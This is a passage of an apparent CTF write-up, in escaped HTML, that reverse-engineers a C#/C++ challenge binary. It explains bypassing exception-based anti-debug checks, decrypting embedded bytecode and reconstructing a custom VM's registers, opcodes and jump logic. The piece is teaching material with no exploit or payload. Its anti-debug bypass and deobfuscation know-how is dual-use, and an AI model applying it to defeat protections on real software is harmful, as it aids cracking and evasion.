&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        handle_exception;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        func6();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The way to bypass such exception checks is to identify the address of the handler (in our case, the  &lt;code&gt;__except&lt;/code&gt;  block) and set a breakpoint there. Then, let your debugger run and when the exception occurs - pass it to the application instead of letting the debugger handle it. This is the standard way to handle &lt;em&gt;most&lt;/em&gt; exception handler checks.&lt;/p&gt;
&lt;p&gt;Again,  &lt;code&gt;func6&lt;/code&gt;  has the token  &lt;code&gt;0x6000006&lt;/code&gt; , let us inspect that in dnSpy.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-14.png&#34; alt=&#34;func6 and func8 in dnspy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Finally! Some actual stuff.&lt;/p&gt;
&lt;p&gt;This function seems pretty straightforward, too. Asks for user input in the pattern  &lt;code&gt;bi0s&amp;#123;...&amp;#125;&lt;/code&gt;  and extracts the content within the flag format.&lt;br /&gt;
 &lt;code&gt;func8()&lt;/code&gt;  is then called with that input as a parameter.&lt;br /&gt;
 &lt;code&gt;func8()&lt;/code&gt;  does nothing but inject the extracted input into the input stream.&lt;/p&gt;
&lt;p&gt;It also calls  &lt;code&gt;func1()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-15.png&#34; alt=&#34;func1 dnSpy decompilation&#34; /&gt;&lt;/p&gt;
&lt;p&gt;(I may have forgotten to remove the names of some of the symbols, so this part accidentally gave away the fact that this is a VM ☠️ nevertheless let us proceed as if we do not know it and see how we can identify one naturally)&lt;/p&gt;
&lt;p&gt;It:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Checks to see if a variable  &lt;code&gt;global_flag&lt;/code&gt;  is set to 1 or not, and exits depending on that&lt;/li&gt;
&lt;li&gt;Calls  &lt;code&gt;decrypt_embedded_instructions()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Calls  &lt;code&gt;func5()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Calls  &lt;code&gt;run_vm()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Based on the result of  &lt;code&gt;run_vm()&lt;/code&gt; , will print either of 2 things (which we can guess will be something along the lines of &amp;quot;true&amp;quot; or &amp;quot;false&amp;quot;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&#39;s break these down step by step.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;global_flag&lt;/code&gt;  is defined at the RVA  &lt;code&gt;0x191B0&lt;/code&gt; , which in IDA maps to a global variable. You xref that, you find it is referenced once at a function whose RVA is  &lt;code&gt;0x1880&lt;/code&gt; . You can look up this RVA now in dnSpy.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-17.png&#34; alt=&#34;0x1880 func1() lookup in dnSpy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Right click -&amp;gt; Analyse  &lt;code&gt;func11()&lt;/code&gt; , and you can find cross references to that function in dnSpy.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-18.png&#34; alt=&#34;func11 used by&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-19.png&#34; alt=&#34;func6 calling func11&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can see that our main logic function (which, if you recall occurs right after an anti-debug check), is benignly setting this variable. No biggie.&lt;/p&gt;
&lt;p&gt;Let&#39;s take a look at what  &lt;code&gt;decrypt_embedded_instructions()&lt;/code&gt;  does.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-16.png&#34; alt=&#34;decrypt_embedded_instructions dnSpy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It seems to be taking an array  &lt;code&gt;embedded_instructions&lt;/code&gt; , and performing the following operation on it:&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;embedded_instruction[i] ^= &lt;span class=&#34;number&#34;&gt;66&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;embedded_instruction[i] = ROR(embedded_instruction[i], &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// where ROR() is rotate right &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then,  &lt;code&gt;func5()&lt;/code&gt;  seems to be defined natively, so we can take a look at that next&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-20.png&#34; alt=&#34;load vm bytes function&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This function seems to be copying bytes from the first argument passed, to a global array. The array passed is  &lt;code&gt;embedded_instructions&lt;/code&gt; , which was just previously decrypted. A counter seems to be incremented for each loop iteration - let&#39;s call that  &lt;code&gt;unc_counter&lt;/code&gt;  for now. Although we do know it&#39;ll contain the total number of instructions present in the VM.&lt;/p&gt;
&lt;p&gt;Aaand next up, we have  &lt;code&gt;run_vm()&lt;/code&gt; , which is going to be our key function to reverse. It is defined at the RVA  &lt;code&gt;0x161C&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;A quick recap before we proceed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Some anti-debug checks (using the  &lt;code&gt;CreateFileW&lt;/code&gt;  API and SEH)&lt;/li&gt;
&lt;li&gt;User input taken in C# using regex, which is injected into the input stream&lt;/li&gt;
&lt;li&gt;Global flag is set to true&lt;/li&gt;
&lt;li&gt;Another exception trigger from C#, which is handled in C++ then handed back to C#&lt;/li&gt;
&lt;li&gt;An unclear array is decrypted and loaded into a global buffer&lt;/li&gt;
&lt;li&gt;A function  &lt;code&gt;run_vm()&lt;/code&gt;  is called&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;the-vm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#the-vm&#34;&gt;#&lt;/a&gt; The VM&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-21.png&#34; alt=&#34;vm setup func&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0x7FF7DF221530&lt;/code&gt;  sets that memory region to 0.&lt;br /&gt;
If we look closely at the function defined at  &lt;code&gt;0x7FF7DF221570&lt;/code&gt; ,&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-22.png&#34; alt=&#34;fetch instruction by counter&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can see there is a loop being run whose iteration count is the number of instructions loaded into  &lt;code&gt;embedded_instructions&lt;/code&gt; . It is loading each element (7 bytes long) from the array, and passing those 7 bytes into a function at  &lt;code&gt;0x7FF7DF221540&lt;/code&gt;  and checking its return value against something.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-23.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This returns a  &lt;code&gt;WORD&lt;/code&gt;  (16 bit) value in the format  &lt;code&gt;[byte_0 &amp;lt;&amp;lt; 8 | byte_2]&lt;/code&gt; . Generally, when we see such weird indices being indexed (especially from a 7 byte long value?), it indicates that the value being indexed might be a structure - and these are members of the structure being accessed.&lt;br /&gt;
So assuming that it &lt;em&gt;is&lt;/em&gt; a structure, we can proceed with a simple structure definition as follows:&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;unc_struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 elem7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After changing all relevant occurances of 7 byte arrays to this structure, we can now continue analysis of this function.&lt;br /&gt;
There is only function call left, which is to  &lt;code&gt;0x7FF7DF221EAC&lt;/code&gt; , which takes the memory region previously initialised to 0 and the return value of the previously called function.&lt;/p&gt;
&lt;p&gt;Frankly, there&#39;s quite a bit to grasp in this function - lots of weird memory accesses and a ton of cases to analyse. A good practice to follow in cases like these is to see if you can find a pattern/generalise the instructions and see if they&#39;re performing something at a higher level.&lt;/p&gt;
&lt;p&gt;Let us see what patterns we can figure out at first glance from this mammoth function:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The same functions being reused in a lot of places (e.g:  &lt;code&gt;0x7FF7DF2210B0&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF2211F0&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF221370&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF221170&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF2211B0&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF221230&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF221330&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF2212F0&lt;/code&gt; ,  &lt;code&gt;0x7FF7DF221550&lt;/code&gt; ). These might seem like a lot but it&#39;s just 9 or 10 functions to reverse which are virtually being used in every case - so if you rev these you rev this entire mammoth!&lt;/li&gt;
&lt;li&gt;A lot of simple arithmetic being performed in each individual case - indicating that this function might be a virtual machine&lt;/li&gt;
&lt;li&gt;The same &amp;quot;control variables&amp;quot; being used in a lot of places - i.e, these variables are used to determine the return values of many functions&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With this in mind, let us start analysing those repetetive functions one at a time.&lt;/p&gt;
&lt;p&gt;(I&#39;ve renamed each of the functions in the list above in the format  &lt;code&gt;func_&amp;#123;i&amp;#125;_unc&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;If you look at each of the functions in the list above, you will notice a few more patterns. Let us go through each of them here.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;unc_mem_buf&lt;/code&gt;  being passed as the 1st parameter, and  &lt;code&gt;elem5&lt;/code&gt;  being passed as the 2nd parameter. The function uses  &lt;code&gt;elem5&lt;/code&gt;  as a &amp;quot;control variable&amp;quot; to pick and return a value from the  &lt;code&gt;unc_mem_buf&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;The list of functions that matches this criteria is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;func_1_unc&lt;/code&gt; : Takes  &lt;code&gt;unc_mem_buf&lt;/code&gt;  as a  &lt;code&gt;char *&lt;/code&gt;  and returns 1 of any 10 bytes from the 0th-10th indices of  &lt;code&gt;unc_mem_buf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_4_unc&lt;/code&gt; : Takes  &lt;code&gt;unc_mem_buf&lt;/code&gt;  as a  &lt;code&gt;short int *&lt;/code&gt;  and returns 1 of any 5  &lt;code&gt;words&lt;/code&gt;  from the 10th-20th indices of  &lt;code&gt;unc_mem_buf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_5_unc&lt;/code&gt; : Takes  &lt;code&gt;unc_mem_buf&lt;/code&gt;  as a  &lt;code&gt;int *&lt;/code&gt;  and returns 1 of any 5  &lt;code&gt;ints&lt;/code&gt;  from the 20th-40th indices of  &lt;code&gt;unc_mem_buf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_2_unc&lt;/code&gt; : Takes  &lt;code&gt;unc_mem_buf&lt;/code&gt;  as a  &lt;code&gt;long long int *&lt;/code&gt;  and returns 1 of any 5  &lt;code&gt;qwords&lt;/code&gt;  from the 40th-80th indices of  &lt;code&gt;unc_mem_buf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can confidently rename the above 4 functions to  &lt;code&gt;select_byte&lt;/code&gt; ,  &lt;code&gt;select_word&lt;/code&gt; ,  &lt;code&gt;select_dword&lt;/code&gt;  and  &lt;code&gt;select_qword&lt;/code&gt;  respectively.&lt;/p&gt;
&lt;p&gt;It is highly risky to define a structure without knowing its size first. However, from the previous function we know that the size of  &lt;code&gt;unc_mem_buf&lt;/code&gt;  is  &lt;code&gt;4466&lt;/code&gt;  bytes. So we can define a structure with what we know so far, and leave the rest as  &lt;code&gt;pad&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;If we analyse the usage of the return values from the above - we can see that these are being used in the operations that we noticed earlier which hinted at this function potentially being a VM.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-28.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;A similar case for the other functions as well. This indicates that those return values are potentially &amp;quot;registers&amp;quot; that are being used inside our VM, meaning that the  &lt;code&gt;select_*&lt;/code&gt;  functions we uncovered earlier are in fact functions to select a register from our VM.&lt;/p&gt;
&lt;p&gt;If we were to define this in a strucure now, it would look a little something like:&lt;br /&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;vm_struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_6;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_9;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; reg_10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; wreg_1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; wreg_2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; wreg_3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; wreg_4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; wreg_5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; dreg_1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; dreg_2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; dreg_3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; dreg_4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; dreg_5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; qreg_1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; qreg_2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; qreg_3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; qreg_4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; qreg_5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; pad[&lt;span class=&#34;number&#34;&gt;4386&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
It would also be a good idea at this point to rename  &lt;code&gt;unc_mem_buf&lt;/code&gt;  to  &lt;code&gt;vm_state&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-29.png&#34; alt=&#34;alt text&#34; /&gt;&lt;br /&gt;
Looks much cleaner now! Let us continue our analysis.&lt;/p&gt;
&lt;p&gt;So considering that this is a VM - we&#39;ve found the registers and the functions that select them - obviously there should also be ones that set them, right? Analysing the rest of the  &lt;code&gt;func_*_unc&lt;/code&gt;  functions, seems like those are it.&lt;br /&gt;
An additional element in these functions would be the value to &amp;quot;set&amp;quot; the register to, so let&#39;s keep a look out for those too.&lt;/p&gt;
&lt;p&gt;After similar analysis as before and some type fixing:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;func_3_unc&lt;/code&gt;  -&amp;gt;  &lt;code&gt;set_q_register&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_6_unc&lt;/code&gt;  -&amp;gt;  &lt;code&gt;set_b_register&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_7_unc&lt;/code&gt;  -&amp;gt;  &lt;code&gt;set_d_register&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;func_8_unc&lt;/code&gt;  -&amp;gt;  &lt;code&gt;set_w_register&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I&#39;ve also renamed the &amp;quot;selection&amp;quot; functions in a similar format, i.e,  &lt;code&gt;get_*_register&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The entire function looks a lot cleaner and more understandable now. It is a clear cut VM. Let us note some more interesting points from further analysis:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vm_state-&amp;gt;pad[0]&lt;/code&gt;  is consistently used in bitwise assignments and comparisons, which indicates it might be some kind of a &amp;quot;flag&amp;quot; register. Let us rename it to  &lt;code&gt;eflags&lt;/code&gt;  (x86 standard)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;v68&lt;/code&gt;  (the return value of the function at  &lt;code&gt;0x7FF7DF221CF0&lt;/code&gt; ) seems to be the main control point of the entire VM, indicating it might be the opcode. This means we would need to analyse how that is being generated.&lt;/li&gt;
&lt;li&gt;In the cases that &lt;em&gt;do&lt;/em&gt; use the (now)  &lt;code&gt;eflags&lt;/code&gt;  register, we can see there is a particular function being called in each one: named  &lt;code&gt;func_9_unc&lt;/code&gt; . Usually,  &lt;code&gt;eflags&lt;/code&gt;  is only checked in the case of  &lt;code&gt;jmp&lt;/code&gt;  instructions.&lt;/li&gt;
&lt;li&gt;There are some yet-to-be defined functions. Upon some inspection, these seem like they are taking a value as an argument, and placing those in a buffer that is part of the  &lt;code&gt;vm_state&lt;/code&gt; . These are nothing but memory write/memory read instructions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We do not have enough context to fully understand  &lt;code&gt;func_9_unc&lt;/code&gt;  yet, so let us switch and look at how that opcode is formed.&lt;/p&gt;
&lt;p&gt;It takes  &lt;code&gt;elem2&lt;/code&gt;  and  &lt;code&gt;elem4&lt;/code&gt;  from our struct, and passes it to some function defined in C#.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/avernos-bi0s-CTF-2025/image-30.png&#34; alt=&#34;decrypt block cipher&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So the first param is some  &lt;code&gt;key&lt;/code&gt; , and the second is the  &lt;code&gt;ciphertext&lt;/code&gt; . Does this mean that each &amp;quot;instruction&amp;quot; (7 byte) is storing the real opcode with the encrypted opcode as well as the key to decrypt it, embedded inside? Let us update the structure with the same.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;elem5&lt;/code&gt;  and  &lt;code&gt;elem6&lt;/code&gt;  in the struct seem to be used as arguments in almost every case in the VM. These might just be the operands for the instruction. Let us change those too.&lt;/p&gt;
&lt;p&gt;Now, for another important function:  &lt;code&gt;0x7FF7DF221540&lt;/code&gt; . This is called twice in the entire binary, once in the VM function, and again when deciding which instruction gets executed next in the VM. So let us take a look.&lt;/p&gt;
&lt;p&gt;For the function that calls it ( &lt;code&gt;0x7FF7DF221570&lt;/code&gt; ), the 2nd argument passed to it is the global variable at  &lt;code&gt;0x7FF7DF2391B4&lt;/code&gt; , which is interestingly incremented after each time the VM function executes, so it might be some kind of program counter.&lt;/p&gt;
&lt;p&gt;That function simply returns a packed form of  &lt;code&gt;elem1&lt;/code&gt;  and  &lt;code&gt;elem3&lt;/code&gt;  in the structure. This seems to be the control point for determining which instruction among all the instructions are to be executed. This could be some kind of value that indicates the &amp;quot;index&amp;quot; of the instruction present in memory, which indicates the order in which they are to be executed.&lt;/p&gt;
&lt;p&gt;Keeping all this in context, revisiting  &lt;code&gt;func_9_unc&lt;/code&gt;  gives us a better idea of its working: it simply calculates the &amp;quot;address&amp;quot; (or in this context, the &lt;em&gt;index&lt;/em&gt;) of the next instruction to be executed. It is the VM&#39;s  &lt;code&gt;calculate_jmp_address&lt;/code&gt;  function.&lt;/p&gt;
&lt;p&gt;With that, we&#39;ve wrapped up the working of the VM! I will leave the actual &lt;em&gt;reversing&lt;/em&gt; of this VM as an exercise to the reader. A quick brief on one of the solution approaches:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extract the instructions from memory by debugging&lt;/li&gt;
&lt;li&gt;Write a disassembler&lt;/li&gt;
